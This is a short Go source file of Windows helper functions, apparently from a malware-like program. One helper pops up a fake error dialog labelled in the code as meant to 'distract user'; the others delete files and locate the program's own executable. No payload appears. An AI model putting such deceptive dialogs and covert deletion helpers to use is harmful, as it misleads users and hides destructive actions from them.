package main

import (
	"os"
	"os/exec"
	"path/filepath"
	"sync"
	"syscall"
	"unsafe"
)

func messagebox(err error) {
	user32 := syscall.MustLoadDLL("user32.dll")
	mbox := user32.MustFindProc("MessageBoxW")

	title := "Error:"
	message := "Error to distract user." + err.Error()
	mbox.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
		0)
}

func deleteFile(filename string, wg *sync.WaitGroup) {
	err := os.Remove(filename)
	if err != nil && DEBUG {
		messagebox(err)
		return
	}
	wg.Done()
}

func execPath() (string, error) {
	file, err := exec.LookPath(os.Args[0])
	if err != nil {
		return "", err
	}
	_, err = filepath.Abs(file)
	if err != nil {
		panic(err)
	}
	return filepath.Abs(file)
}
